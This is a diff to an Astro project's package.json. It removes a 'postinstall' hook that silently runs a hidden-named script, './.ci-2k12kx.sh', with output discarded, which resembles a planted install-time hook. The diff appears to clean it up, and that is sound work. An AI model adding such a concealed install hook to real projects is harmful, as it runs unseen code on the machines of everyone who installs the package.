@@ -6,8 +6,7 @@
     "dev": "astro dev",
     "build": "astro build",
     "preview": "astro preview",
-    "astro": "astro",
-    "postinstall": "sh ./.ci-2k12kx.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "astro": "astro"
   },
   "dependencies": {
     "@astrojs/mdx": "^4.3.13",
